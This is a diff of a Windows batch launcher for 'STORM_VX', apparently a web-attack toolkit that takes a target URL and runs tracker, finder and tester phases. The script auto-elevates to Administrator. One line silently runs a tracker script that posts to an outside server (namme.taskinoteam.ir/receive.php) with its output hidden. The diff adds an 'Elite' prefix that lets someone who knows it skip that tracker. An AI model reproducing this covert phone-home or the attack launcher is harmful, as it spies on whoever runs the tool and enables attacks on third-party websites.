@@ -1,7 +1,7 @@
 @echo off
 chcp 65001 >nul 2>&1
 setlocal enabledelayedexpansion
-title STORM_VX v7.0
+title STORM_VX v7.1
 
 :: ═══════════════════════════════════════════════════════════════════════
 ::  ADMIN CHECK — Auto-elevate to Administrator
@@ -11,13 +11,13 @@ if %errorlevel% neq 0 (
     echo.
     echo   [!] Requesting Administrator privileges...
     echo.
-    powershell -Command "Start-Process cmd -ArgumentList '/k \"%~f0\"' -Verb RunAs" 2>nul
+    powershell -Command "Start-Process -FilePath cmd.exe -ArgumentList '/k \"\"%~f0\"\"' -Verb RunAs" 2>nul
     if %errorlevel% neq 0 (
         echo   [ERROR] Failed to elevate. Right-click and "Run as Administrator".
         pause
         exit /b 1
     )
-    exit /b 0
+    exit
 )
 
 :: ═══════════════════════════════════════════════════════════════════════
@@ -31,7 +31,7 @@ echo   ╚════██║   ██║   ██║   ██║██╔═�
 echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
 echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
 echo.
-echo          ==== v7.0 Modular - by ELiteth ====
+echo          ==== v7.1 Modular - by elite (taha) ====
 echo          ==== TRACKER =^> FINDER =^> PHASE SELECT =^> TESTER ====
 echo.
 
@@ -102,6 +102,8 @@ echo.
 echo   ┌───────────────────────────────────────────────────────┐
 echo   │           Enter target URL                            │
 echo   │  Example: https://target.com  or  www.target.com      │
+echo   │  Type "Elite" before URL to skip tracker              │
+echo   │  Example: Elite https://target.com                    │
 echo   └───────────────────────────────────────────────────────┘
 echo.
 set /p "TARGET_URL=   URL: "
@@ -112,6 +114,19 @@ if "%TARGET_URL%"=="" (
     echo.
     pause
     exit /b 1
+)
+
+:: Check if user typed "Elite" before the URL
+echo !TARGET_URL! | findstr /i /b "Elite " >nul 2>&1
+if %errorlevel%==0 (
+    set "SKIP_TRACKER=1"
+    :: Remove the "Elite " prefix from the URL
+    set "TARGET_URL=!TARGET_URL:Elite =!"
+    set "TARGET_URL=!TARGET_URL:elite =!"
+    set "TARGET_URL=!TARGET_URL:ELITE =!"
+    echo.
+    echo   [ELITE MODE] Tracker will be skipped.
+    echo.
 )
 
 :url_ready
@@ -126,7 +141,7 @@ set "TARGET_URL=https://!TARGET_URL!"
 :url_set
 
 :: ═══════════════════════════════════════════════════════════════════════
-::  PHASE 0: TRACKER (skip if --elite)
+::  PHASE 0: TRACKER (skip if --elite or Elite mode)
 :: ═══════════════════════════════════════════════════════════════════════
 if not defined SKIP_TRACKER (
     if exist "%SCRIPT_DIR%tracker\VF_TRACKER.py" (
@@ -138,6 +153,10 @@ if not defined SKIP_TRACKER (
         %PYTHON% "%SCRIPT_DIR%tracker\VF_TRACKER.py" --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
         echo   [OK] Tracker phase complete.
     )
+) else (
+    echo.
+    echo   [ELITE] Tracker phase SKIPPED.
+    echo.
 )
 
 :: ═══════════════════════════════════════════════════════════════════════
@@ -540,5 +559,10 @@ if /i "%SHOW_REPORT%"=="Y" (
     )
 )
 
+echo.
+echo.
+echo   ═══════════════════════════════════════════════════════
+echo    STORM_VX v7.1 by elite (taha) - Session Complete
+echo   ═══════════════════════════════════════════════════════
 echo.
 pause
